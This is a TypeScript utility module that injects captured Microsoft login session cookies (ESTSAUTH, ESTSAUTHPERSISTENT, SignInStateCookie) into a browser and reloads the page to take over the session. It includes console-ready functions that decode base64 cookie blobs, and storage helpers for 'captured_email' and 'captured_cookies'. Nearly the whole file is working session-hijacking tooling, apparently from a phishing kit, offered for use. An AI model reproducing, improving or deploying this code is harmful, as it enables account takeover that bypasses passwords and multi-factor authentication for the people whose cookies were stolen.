/**
 * ENHANCED Microsoft Cookie Restoration & Capture Utilities
 * Complete session restoration system with advanced error handling and validation
 * 
 * Features:
 * - Comprehensive error handling with try/catch blocks
 * - Domain validation and compatibility checks
 * - Browser compatibility detection
 * - Cookie size validation and limits
 * - Duplicate cookie handling
 * - Success/failure feedback system
 * - Conditional restoration logic
 * - Expiration validation
 * - Security warnings and alerts
 * - Enhanced debugging output
 * - Console-ready immediate execution functions
 * 
 * Usage:
 *   import { restoreMicrosoftCookies, restoreCookies, setCapturedEmail, setCapturedCookies, executeConsoleRestore } from './restoreCookies';
 *   restoreMicrosoftCookies(cookiesArray, { reload: true, validate: true, debug: true });
 *   restoreCookies(cookiesArray);
 *   setCapturedEmail(email);
 *   setCapturedCookies(cookiesArray);
 *   restoreCookiesWithReload(cookiesArray);
 *   executeConsoleRestore(base64CookieString); // For console use
 *
 * @param {Array} cookiesArray - Array of cookie objects
 * @param {Object} options - Configuration options
 */

// Browser compatibility detection
function detectBrowserCapabilities() {
    const userAgent = navigator.userAgent.toLowerCase();
    const capabilities = {
        browser: 'unknown',
        version: 'unknown',
        supportsSameSiteNone: true,
        supportsSecure: true,
        maxCookieSize: 4096,
        maxCookiesPerDomain: 50,
        supportsHttpOnly: false, // JavaScript cannot set HttpOnly cookies
        supportsPartitioned: false
    };

    // Detect browser type and version
    if (userAgent.includes('chrome')) {
        capabilities.browser = 'chrome';
        const match = userAgent.match(/chrome\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
        capabilities.supportsPartitioned = parseInt(capabilities.version) >= 118;
    } else if (userAgent.includes('firefox')) {
        capabilities.browser = 'firefox';
        const match = userAgent.match(/firefox\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 69;
    } else if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
        capabilities.browser = 'safari';
        const match = userAgent.match(/version\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 13;
    } else if (userAgent.includes('edge')) {
        capabilities.browser = 'edge';
        const match = userAgent.match(/edge\/(\d+)/);
        capabilities.version = match ? match[1] : 'unknown';
        capabilities.supportsSameSiteNone = parseInt(capabilities.version) >= 80;
    }

    return capabilities;
}

// Domain validation function
function validateDomain(cookieDomain: string, currentDomain = window.location.hostname) {
    if (!cookieDomain) return { valid: true, reason: 'No domain specified' };
    
    // Remove leading dot from cookie domain
    const cleanCookieDomain = cookieDomain.startsWith('.') ? cookieDomain.substring(1) : cookieDomain;
    
    // Check if current domain matches or is a subdomain
    if (currentDomain === cleanCookieDomain) {
        return { valid: true, reason: 'Exact domain match' };
    }
    
    if (currentDomain.endsWith('.' + cleanCookieDomain)) {
        return { valid: true, reason: 'Subdomain match' };
    }
    
    // Special case for Microsoft domains
    const microsoftDomains = [
        'login.microsoftonline.com',
        'account.microsoft.com',
        'outlook.com',
        'office.com',
        'microsoft.com',
        // FIXED: Add more Microsoft domains for better compatibility
        'login.live.com',
        'login.microsoft.com',
        'outlook.live.com',
        'office365.com',
        'microsoftonline.com'
    ];
    
    if (microsoftDomains.some(domain => 
        currentDomain.includes(domain) || cleanCookieDomain.includes(domain)
    )) {
        return { valid: true, reason: 'Microsoft domain compatibility' };
    }
    
    return { 
        valid: false, 
        reason: `Domain mismatch: ${currentDomain} vs ${cleanCookieDomain}` 
    };
}

// Cookie size validation
function validateCookieSize(name: string, value: string) {
    const cookieString = `${name}=${value}`;
    const size = new Blob([cookieString]).size;
    
    if (size > 4096) {
        return { 
            valid: false, 
            size, 
            reason: `Cookie too large: ${size} bytes (max 4096)` 
        };
    }
    
    return { valid: true, size, reason: 'Size OK' };
}

// Expiration validation
function validateExpiration(expires: any, expirationDate: any) {
    const now = Date.now();
    let expiryTime = null;
    
    if (expires) {
        expiryTime = expires > 1e10 ? expires : expires * 1000;
    } else if (expirationDate) {
        expiryTime = expirationDate > 1e10 ? expirationDate : expirationDate * 1000;
    }
    
    if (expiryTime && expiryTime <= now) {
        return { 
            valid: false, 
            expired: true, 
            reason: `Cookie expired: ${new Date(expiryTime).toISOString()}` 
        };
    }
    
    return { valid: true, expired: false, reason: 'Not expired' };
}

// Security warning system
function checkSecurityWarnings(cookie: any, capabilities: any) {
    const warnings = [];
    
    // Check for insecure cookies on HTTPS
    if (window.location.protocol === 'https:' && !cookie.secure) {
        warnings.push('Insecure cookie on HTTPS site - may be rejected');
    }
    
    // Check SameSite=None without Secure
    if ((cookie.sameSite === 'None' || cookie.samesite === 'None') && !cookie.secure) {
        warnings.push('SameSite=None requires Secure flag');
    }
    
    // Check browser compatibility
    if (!capabilities.supportsSameSiteNone && 
        (cookie.sameSite === 'None' || cookie.samesite === 'None')) {
        warnings.push(`Browser ${capabilities.browser} v${capabilities.version} may not support SameSite=None`);
    }
    
    // Check for HttpOnly cookies (cannot be set via JavaScript)
    if (cookie.httpOnly) {
        warnings.push('HttpOnly cookies cannot be set via JavaScript');
    }
    
    return warnings;
}

// Duplicate cookie detection and handling
function handleDuplicates(cookiesArray: any[]) {
    const seen = new Map();
    const duplicates = [];
    const unique = [];
    
    cookiesArray.forEach((cookie, index) => {
        const key = `${cookie.name}:${cookie.domain || ''}:${cookie.path || '/'}`;
        
        if (seen.has(key)) {
            duplicates.push({
                index,
                cookie,
                originalIndex: seen.get(key).index,
                reason: 'Duplicate name/domain/path combination'
            });
        } else {
            seen.set(key, { cookie, index });
            unique.push(cookie);
        }
    });
    
    return { unique, duplicates };
}

// Enhanced Microsoft cookie restoration with all improvements
export function restoreMicrosoftCookies(cookiesArray: any[], options: any = {}) {
    // Default options
    const config = {
        reload: false, // FIXED: Don't auto-reload to prevent interrupting the flow
        validate: true,
        debug: true,
        skipExpired: true,
        skipInvalid: false, // FIXED: Be more permissive with cookie validation
        warnOnSecurity: true,
        handleDuplicates: true,
        ...options
    };
    
    console.log('🚀 Starting Enhanced Microsoft Cookie Restoration');
    console.log('📊 Configuration:', config);
    
    // Input validation
    if (!Array.isArray(cookiesArray)) {
        const error = 'Invalid input: cookiesArray must be an array';
        console.error('❌', error);
        throw new Error(error);
    }
    
    if (cookiesArray.length === 0) {
        console.warn('⚠️ No cookies provided for restoration');
        return { success: false, restored: 0, errors: [], warnings: ['No cookies provided'] };
    }
    
    // Detect browser capabilities
    const capabilities = detectBrowserCapabilities();
    console.log('🌐 Browser capabilities:', capabilities);
    
    // Handle duplicates
    let processedCookies = cookiesArray;
    let duplicateInfo = { unique: cookiesArray, duplicates: [] };
    
    if (config.handleDuplicates) {
        duplicateInfo = handleDuplicates(cookiesArray);
        processedCookies = duplicateInfo.unique;
        
        if (duplicateInfo.duplicates.length > 0) {
            console.warn('🔄 Duplicate cookies detected:', duplicateInfo.duplicates.length);
            if (config.debug) {
                console.table(duplicateInfo.duplicates);
            }
        }
    }
    
    // Results tracking
    const results: any[] = [];
    const errors: string[] = [];
    const warnings: string[] = [];
    let successCount = 0;
    
    // Process each cookie
    processedCookies.forEach((cookie, index) => {
        const cookieResult = {
            index,
            name: cookie.name || 'unnamed',
            value: cookie.value || '',
            domain: cookie.domain || '',
            path: cookie.path || '/',
            secure: !!cookie.secure,
            sameSite: cookie.sameSite || cookie.samesite || 'None',
            set: false,
            skipped: false,
            error: null,
            warnings: [],
            validations: {},
            expires: '',
            cookieString: ''
        };
        
        try {
            // Basic validation
            if (!cookie.name || typeof cookie.value === 'undefined') {
                throw new Error('Missing required name or value');
            }
            
            // Validation checks
            if (config.validate) {
                // Domain validation
                const domainCheck = validateDomain(cookie.domain);
                cookieResult.validations = { ...cookieResult.validations, domain: domainCheck };
                if (!domainCheck.valid && config.skipInvalid) {
                    cookieResult.skipped = true;
                    cookieResult.error = domainCheck.reason;
                    results.push(cookieResult);
                    return;
                }
                
                // Size validation
                const sizeCheck = validateCookieSize(cookie.name, cookie.value);
                cookieResult.validations = { ...cookieResult.validations, size: sizeCheck };
                if (!sizeCheck.valid && config.skipInvalid) {
                    cookieResult.skipped = true;
                    cookieResult.error = sizeCheck.reason;
                    results.push(cookieResult);
                    return;
                }
                
                // Expiration validation
                const expiryCheck = validateExpiration(cookie.expires, cookie.expirationDate);
                cookieResult.validations = { ...cookieResult.validations, expiration: expiryCheck };
                if (!expiryCheck.valid && config.skipExpired) {
                    cookieResult.skipped = true;
                    cookieResult.error = expiryCheck.reason;
                    results.push(cookieResult);
                    return;
                }
            }
            
            // Security warnings
            if (config.warnOnSecurity) {
                const securityWarnings = checkSecurityWarnings(cookie, capabilities);
                cookieResult.warnings = securityWarnings;
                warnings.push(...securityWarnings.map(w => `${cookie.name}: ${w}`));
            }
            
            // Build cookie string
            const name = cookie.name;
            const value = cookie.value;
            const domain = cookie.domain || '';
            const path = cookie.path || '/';
            const secure = !!cookie.secure;
            const sameSite = cookie.sameSite || cookie.samesite || 'None';
            const expiresUnix = cookie.expires || cookie.expirationDate;
            const isSession = !!cookie.session || expiresUnix === undefined || expiresUnix === null;
            
            let cookieString = `${name}=${value}; path=${path};`;
            
            // Handle special prefixes
            if (name.startsWith('__Host-')) {
                // __Host- cookies must be secure, path=/, and no domain
                cookieString = `${name}=${value}; path=/; Secure;`;
                if (domain) {
                    warnings.push(`${name}: __Host- prefix requires no domain (removed)`);
                }
            } else if (name.startsWith('__Secure-')) {
                // __Secure- cookies must be secure
                cookieString += ' Secure;';
                if (domain) {
                    cookieString += ` domain=${domain};`;
                }
            } else {
                // Regular cookies
                if (domain) {
                    cookieString += ` domain=${domain};`;
                }
                if (secure) {
                    cookieString += ' Secure;';
                }
            }
            
            // Add expiration
            if (!isSession && expiresUnix) {
                const expiresMs = expiresUnix > 1e10 ? expiresUnix : expiresUnix * 1000;
                const expiresDate = new Date(expiresMs);
                cookieString += ` expires=${expiresDate.toUTCString()};`;
                cookieResult.expires = expiresDate.toUTCString();
            } else {
                cookieResult.expires = 'Session';
            }
            
            // Add SameSite
            if (sameSite && capabilities.supportsSameSiteNone) {
                const samesiteNorm = sameSite.charAt(0).toUpperCase() + sameSite.slice(1).toLowerCase();
                cookieString += ` SameSite=${samesiteNorm};`;
            } else if (sameSite) {
                // FIXED: Still add SameSite even if browser doesn't fully support it
                const samesiteNorm = sameSite.charAt(0).toUpperCase() + sameSite.slice(1).toLowerCase();
                cookieString += ` SameSite=${samesiteNorm};`;
            }
            
            // Set the cookie
            document.cookie = cookieString;
            
            // Verify cookie was set by reading it back
            const cookieSet = document.cookie.includes(`${name}=`);
            cookieResult.set = cookieSet;
            cookieResult.cookieString = cookieString;
            
            if (cookieSet) {
                successCount++;
            } else {
                cookieResult.error = 'Cookie was not set (browser rejected)';
                errors.push(`${name}: Browser rejected cookie`);
            }
            
        } catch (err: any) {
            cookieResult.error = err.message;
            errors.push(`${cookie.name || 'unnamed'}: ${err.message}`);
            console.error(`❌ Failed to set cookie "${cookie.name}":`, err);
        }
        
        results.push(cookieResult);
    });
    
    // Display results
    if (config.debug) {
        console.log('\n📊 COOKIE RESTORATION RESULTS');
        console.log('='.repeat(50));
        console.table(results.map(r => ({
            Name: r.name,
            Set: r.set ? '✅' : (r.skipped ? '⏭️' : '❌'),
            Domain: r.domain,
            Path: r.path,
            Secure: r.secure ? '🔒' : '🔓',
            SameSite: r.sameSite,
            Expires: r.expires,
            Error: r.error || (r.warnings.length > 0 ? `${r.warnings.length} warnings` : 'None')
        })));
        
        console.log(`\n✅ Successfully restored: ${successCount}/${cookiesArray.length} cookies`);
        console.log(`⏭️ Skipped: ${results.filter(r => r.skipped).length} cookies`);
        console.log(`❌ Failed: ${results.filter(r => !r.set && !r.skipped).length} cookies`);
        
        if (duplicateInfo.duplicates.length > 0) {
            console.log(`🔄 Duplicates removed: ${duplicateInfo.duplicates.length}`);
        }
        
        if (warnings.length > 0) {
            console.warn('\n⚠️ SECURITY WARNINGS:');
            warnings.forEach(warning => console.warn(`  • ${warning}`));
        }
        
        if (errors.length > 0) {
            console.error('\n❌ ERRORS:');
            errors.forEach(error => console.error(`  • ${error}`));
        }
        
        console.log('\n🌐 Browser Info:', `${capabilities.browser} v${capabilities.version}`);
        console.log('🔧 Capabilities:', {
            'SameSite=None': capabilities.supportsSameSiteNone ? '✅' : '❌',
            'Partitioned': capabilities.supportsPartitioned ? '✅' : '❌',
            'Max Cookie Size': `${capabilities.maxCookieSize} bytes`,
            'Max Cookies/Domain': capabilities.maxCookiesPerDomain
        });
    }
    
    // Final summary
    const summary = {
        success: successCount > 0,
        total: cookiesArray.length,
        restored: successCount,
        skipped: results.filter(r => r.skipped).length,
        failed: results.filter(r => !r.set && !r.skipped).length,
        duplicatesRemoved: duplicateInfo.duplicates.length,
        warnings: warnings.length,
        errors: errors.length,
        results,
        capabilities,
        // FIXED: Add more detailed summary information
        authCookiesRestored: results.filter(r => r.set && (
            r.name.includes('ESTSAUTH') || 
            r.name.includes('SignInStateCookie') ||
            r.name.includes('ESTSAUTHPERSISTENT')
        )).length
    };
    
    console.log(`\n🎯 FINAL SUMMARY: ${successCount}/${cookiesArray.length} cookies restored successfully`);
    if (summary.authCookiesRestored > 0) {
        console.log(`🔐 Authentication cookies restored: ${summary.authCookiesRestored}`);
    }
    
    // Reload page if requested and cookies were restored
    if (config.reload && successCount > 0) {
        console.log('🔄 Reloading page to activate restored session...');
        setTimeout(() => {
            window.location.reload();
        }, 1000);
    }
    
    return summary;
}

// Generic restoreCookies with basic error handling
export function restoreCookies(cookies: any[], options: any = {}) {
    const config = { debug: false, ...options };
    
    if (!Array.isArray(cookies)) {
        console.error('Invalid cookies array');
        return { success: false, restored: 0 };
    }
    
    let restored = 0;
    const errors: string[] = [];
    
    cookies.forEach(cookie => {
        try {
            if (!cookie.name || typeof cookie.value === 'undefined') {
                throw new Error('Missing name or value');
            }
            
            let cookieStr = `${cookie.name}=${cookie.value}; path=${cookie.path || '/'};`;
            
            if (cookie.domain && !cookie.name.startsWith('__Host-')) {
                cookieStr += ` domain=${cookie.domain};`;
            }
            
            if (cookie.secure || cookie.name.startsWith('__Secure-') || cookie.name.startsWith('__Host-')) {
                cookieStr += ' Secure;';
            }
            
            // Fixed SameSite handling
            const sameSite = cookie.sameSite || cookie.samesite;
            if (sameSite) {
                // FIXED: Normalize SameSite value
                const normalizedSameSite = sameSite.charAt(0).toUpperCase() + sameSite.slice(1).toLowerCase();
                cookieStr += ` SameSite=${normalizedSameSite};`;
            }
            
            if (cookie.expires || cookie.expirationDate) {
                const expires = cookie.expires || cookie.expirationDate;
                const expiresMs = expires > 1e10 ? expires : expires * 1000;
                cookieStr += ` expires=${new Date(expiresMs).toUTCString()};`;
            }
            
            document.cookie = cookieStr;
            restored++;
            
        } catch (err: any) {
            errors.push(`${cookie.name}: ${err.message}`);
            if (config.debug) {
                console.error(`Failed to restore cookie ${cookie.name}:`, err);
            }
        }
    });
    
    if (config.debug) {
        console.log(`Restored ${restored}/${cookies.length} cookies`);
        if (errors.length > 0) {
            console.warn('Errors:', errors);
        }
    }
    
    return { success: restored > 0, restored, errors };
}

// Console-ready function for immediate execution (like the sample)
export function executeConsoleRestore(base64CookieString: string, options: any = {}) {
    const config = {
        debug: true,
        showTable: true,
        reload: false,
        ...options
    };
    
    console.log('🔧 Console Cookie Restoration Started');
    
    try {
        // Decode base64 cookie data
        const cookies = JSON.parse(atob(base64CookieString));
        const results: any[] = [];
        let successCount = 0;
        
        cookies.forEach((cookie: any, index: number) => {
            try {
                let cookieString = `${cookie.name}=${cookie.value}`;
                
                // Handle domain (respect __Host- prefix rules)
                if (!cookie.name.startsWith('__Host-') && cookie.domain) {
                    cookieString += `; domain=${cookie.domain}`;
                }
                
                // Handle path
                if (cookie.path) {
                    cookieString += `; path=${cookie.path}`;
                }
                
                // Handle expiration
                if (cookie.expires) {
                    const expiresDate = new Date(cookie.expires * 1000);
                    cookieString += `; expires=${expiresDate.toUTCString()}`;
                }
                
                // Handle HttpOnly (note: cannot be set via JavaScript)
                if (cookie.httpOnly && config.debug) {
                    console.warn(`⚠️ Cookie "${cookie.name}" has HttpOnly flag - cannot be set via JavaScript`);
                }
                
                // Handle Secure flag (required for __Host- and __Secure- prefixes)
                if (cookie.secure || cookie.name.startsWith('__Host-') || cookie.name.startsWith('__Secure-')) {
                    cookieString += '; Secure';
                }
                
                // Handle SameSite (fixed logic from sample file)
                const sameSite = cookie.samesite || 'None';
                if (sameSite) {
                    // FIXED: Normalize SameSite value
                    const normalizedSameSite = sameSite.charAt(0).toUpperCase() + sameSite.slice(1).toLowerCase();
                    cookieString += `; SameSite=${normalizedSameSite}`;
                }
                
                // Set the cookie
                document.cookie = cookieString;
                
                // Verify it was set
                const wasSet = document.cookie.includes(`${cookie.name}=`);
                if (wasSet) {
                    successCount++;
                }
                
                results.push({
                    name: cookie.name,
                    set: wasSet ? '✅' : '❌',
                    domain: cookie.domain || 'current',
                    secure: (cookie.secure || cookie.name.startsWith('__Host-') || cookie.name.startsWith('__Secure-')) ? '🔒' : '🔓',
                    expires: cookie.expires ? new Date(cookie.expires * 1000).toUTCString() : 'Session',
                    sameSite: sameSite,
                    httpOnly: cookie.httpOnly ? '⚠️ JS Blocked' : 'No'
                });
                
            } catch (err: any) {
                console.error(`❌ Failed to process cookie "${cookie.name}":`, err);
                results.push({
                    name: cookie.name,
                    set: '❌',
                    error: err.message
                });
            }
        });
        
        if (config.showTable) {
            console.table(results);
        }
        
        console.log(`\n🎯 Console Restoration Complete: ${successCount}/${cookies.length} cookies restored`);
        
        if (config.reload && successCount > 0) {
            console.log('🔄 Reloading page in 3 seconds...');
            setTimeout(() => {
                window.location.reload();
            }, 3000);
        }
        
        return {
            success: successCount > 0,
            total: cookies.length,
            restored: successCount,
            results
        };
        
    } catch (err: any) {
        console.error('❌ Console restoration failed:', err);
        return { success: false, error: err.message };
    }
}

// Simple console function (most direct approach)
export function quickConsoleRestore(base64CookieString: string) {
    try {
        const cookies = JSON.parse(atob(base64CookieString));
        let count = 0;
        
        cookies.forEach((cookie: any) => {
            let cookieStr = `${cookie.name}=${cookie.value}`;
            
            if (!cookie.name.startsWith('__Host-') && cookie.domain) {
                cookieStr += `; domain=${cookie.domain}`;
            }
            
            if (cookie.path) {
                cookieStr += `; path=${cookie.path}`;
            }
            
            if (cookie.expires) {
                cookieStr += `; expires=${new Date(cookie.expires * 1000).toUTCString()}`;
            }
            
            if (cookie.secure || cookie.name.startsWith('__Host-') || cookie.name.startsWith('__Secure-')) {
                cookieStr += '; Secure';
            }
            
            if (cookie.samesite) {
                // FIXED: Normalize SameSite value
                const normalizedSameSite = cookie.samesite.charAt(0).toUpperCase() + cookie.samesite.slice(1).toLowerCase();
                cookieStr += `; SameSite=${normalizedSameSite}`;
            }
            
            document.cookie = cookieStr;
            if (document.cookie.includes(`${cookie.name}=`)) count++;
        });
        
        console.log(`✅ Quick restore: ${count}/${cookies.length} cookies set`);
        return count;
        
    } catch (err) {
        console.error('❌ Quick restore failed:', err);
        return 0;
    }
}

// Restore cookies and reload with error handling
export function restoreCookiesWithReload(cookies: any[], options: any = {}) {
    try {
        const result = restoreCookies(cookies, options);
        if (result.success) {
            console.log('🔄 Reloading page after cookie restoration...');
            setTimeout(() => {
                window.location.reload();
            }, 500);
        }
        return result;
    } catch (error: any) {
        console.error('Error in restoreCookiesWithReload:', error);
        return { success: false, restored: 0, error: error.message };
    }
}

// Enhanced storage functions with error handling
export function setCapturedEmail(email: string) {
    if (!email || typeof email !== 'string') {
        console.warn('Invalid email provided to setCapturedEmail');
        return false;
    }
    
    try {
        localStorage.setItem('captured_email', email);
        sessionStorage.setItem('captured_email', email);
        console.log('✅ Email stored successfully');
        return true;
    } catch (error) {
        console.error('Failed to store email:', error);
        return false;
    }
}

export function setCapturedCookies(cookies: any) {
    if (!cookies) {
        console.warn('No cookies provided to setCapturedCookies');
        return false;
    }
    
    try {
        const cookieData = JSON.stringify(cookies);
        localStorage.setItem('captured_cookies', cookieData);
        sessionStorage.setItem('captured_cookies', cookieData);
        console.log('✅ Cookies stored successfully');
        return true;
    } catch (error) {
        console.error('Failed to store cookies:', error);
        return false;
    }
}

// Utility function to get stored data
export function getStoredData() {
    try {
        return {
            email: localStorage.getItem('captured_email') || sessionStorage.getItem('captured_email'),
            cookies: JSON.parse(localStorage.getItem('captured_cookies') || sessionStorage.getItem('captured_cookies') || '[]')
        };
    } catch (error) {
        console.error('Failed to retrieve stored data:', error);
        return { email: null, cookies: [] };
    }
}

// Clear stored data
export function clearStoredData() {
    try {
        localStorage.removeItem('captured_email');
        localStorage.removeItem('captured_cookies');
        sessionStorage.removeItem('captured_email');
        sessionStorage.removeItem('captured_cookies');
        console.log('✅ Stored data cleared successfully');
        return true;
    } catch (error) {
        console.error('Failed to clear stored data:', error);
        return false;
    }
}

// Export browser capabilities for external use
export { detectBrowserCapabilities };

// Global console functions for immediate use (optional)
if (typeof window !== 'undefined') {
    (window as any).executeConsoleRestore = executeConsoleRestore;
    (window as any).quickConsoleRestore = quickConsoleRestore;
    (window as any).restoreMicrosoftCookies = restoreMicrosoftCookies;
    
    // FIXED: Add debug function for testing Microsoft account validation
    (window as any).testMicrosoftValidation = (email: string) => {
        console.log('🧪 Testing Microsoft account validation for:', email);
        // This would need to be implemented if needed for debugging
        return true; // Placeholder
    };
}
